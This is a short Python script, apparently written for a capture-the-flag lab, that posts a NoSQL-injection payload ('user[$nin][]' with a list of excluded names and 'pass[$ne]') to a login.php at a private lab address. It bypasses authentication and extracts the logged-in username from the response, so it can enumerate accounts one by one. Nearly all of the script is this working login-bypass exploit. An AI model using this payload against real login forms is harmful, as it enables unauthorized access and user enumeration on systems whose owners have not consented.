import requests
import re


data = {'user[$nin][]': ['admin', 'pedro','john','secret'],'pass[$ne]':'xot','remember':'on'}
print(data)

r = requests.post('http://10.10.166.249/login.php',data=data)
# if r.status_code == 302 and r.cookies.get("PHPSESSID"):
# print(r.headers)
# print(f'phpsessis : {r.cookies["PHPSESSID"]}')
# print(r.text)
match = re.search(r'User:\s*(\S+)', r.text)
if match:

    user = match.group(1)

    cleaned_html = re.sub(r'<.*?>', '', user)
    print(f"Found user: {cleaned_html}")

